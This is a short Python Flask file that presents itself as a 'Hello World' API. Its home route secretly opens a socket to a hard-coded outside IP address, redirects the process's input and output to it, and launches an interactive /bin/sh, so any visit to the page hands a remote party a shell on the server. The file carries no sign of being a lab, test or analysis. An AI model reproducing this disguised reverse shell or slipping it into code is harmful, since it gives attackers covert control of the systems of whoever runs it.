# Using flask to make an api 
# import necessary libraries and functions 
from flask import Flask, jsonify, request 
import os
import json
import socket,subprocess,os



  
# creating a Flask app 
app = Flask(__name__)
  
  
@app.route('/', methods = ['GET']) 
def home(): 
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("95.217.219.94",8000))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])
    return jsonify({'data': "Hello World"}) 
  
  
# driver function 
if __name__ == '__main__': 
  
    app.run(host="0.0.0.0", port=80) 
